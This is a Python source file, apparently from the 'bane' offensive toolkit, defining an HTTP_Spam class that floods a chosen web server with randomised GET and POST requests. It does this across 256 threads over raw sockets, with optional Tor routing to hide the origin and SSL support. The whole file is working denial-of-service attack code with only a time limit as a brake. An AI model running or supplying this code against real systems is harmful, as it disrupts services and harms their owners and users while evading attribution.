from bane.ddos.utils import *

class HTTP_Spam(DDoS_Class):
    def __init__(
        self,
        u,
        p=80,
        cookie=None,
        user_agents=None,
        method=3,
        threads_daemon=True,
        paths=["/"],
        threads=256,
        post_min=5,
        post_max=10,
        post_field_max=100,
        post_field_min=50,
        timeout=5,
        round_min=1000,
        round_max=10000,
        interval=0.001,
        duration=60,
        tor=False,
        ssl_on=False,
        logs=True,
    ):
        self.ssl_on=ssl_on
        self.logs = logs
        self.cookie = cookie
        self.user_agents = user_agents
        self.method = method
        self.stop = False
        self.counter = 0
        self.fails=0
        self.start = time.time()
        self.target = u
        self.duration = duration
        self.port = p
        self.timeout = timeout
        self.tor = tor
        self.interval = interval
        self.round_min = round_min
        self.round_max = round_max
        self.paths = paths
        self.post_min = post_min
        self.post_max = post_max
        self.post_field_max = post_field_max
        self.post_field_min = post_field_min
        for x in range(threads):
            try:
                t = threading.Thread(target=self.attack)
                t.daemon = threads_daemon
                t.start()
            except:
                pass

    def attack(self):
        try:
            time.sleep(1)
            while True:
                if (
                    int(time.time() - self.start) >= self.duration
                ):  # this is a safety mechanism so the attack won't run forever
                    break
                if self.stop == True:
                    break
                try:
                    if self.tor==True:
                        s=Socket_Connection.get_tor_socket_connection(self.target,self.port,timeout=self.timeout)
                    else:
                        s=Socket_Connection.get_socket_connection(self.target,self.port,timeout=self.timeout)
                    if self.port==443 or self.ssl_on==True:
                        s=Socket_Connection.wrap_socket_with_ssl(s,self.target)
                    for l in range(random.randint(self.round_min, self.round_max)):
                        if self.method == 3:
                            ty = random.randint(1, 2)
                        else:
                            ty = self.method
                        if ty == 1:
                            req = "GET"
                        else:
                            req = "POST"
                        m = Socket_Connection.setup_http_packet(
                            self.target,
                            ty,
                            self.paths,
                            self.post_field_min,
                            self.post_field_max,
                            self.post_min,
                            self.post_max,
                            self.cookie,
                            [self.get_user_agent() for x in range(5)],
                        )
                        try:
                            if self.stop == True:
                                break
                            s.send(m.encode("utf-8"))
                            self.counter += 1
                            if self.logs == True:
                                sys.stdout.write(
                                    "\rRequest: {} | Type: {} | Bytes: {}   ".format(
                                        self.counter, req, len(m)
                                    )
                                )
                                sys.stdout.flush()
                                # print("Request: {} | Type: {} | Bytes: {}".format(http_counter,req,len(m)))
                            time.sleep(self.interval)
                        except Exception as ex:
                            #print(ex)
                            self.fails+=1
                            break
                        time.sleep(self.interval)
                    s.close()
                except:
                    self.fails+=1
                time.sleep(0.1)
            self.kill()
        except:
            pass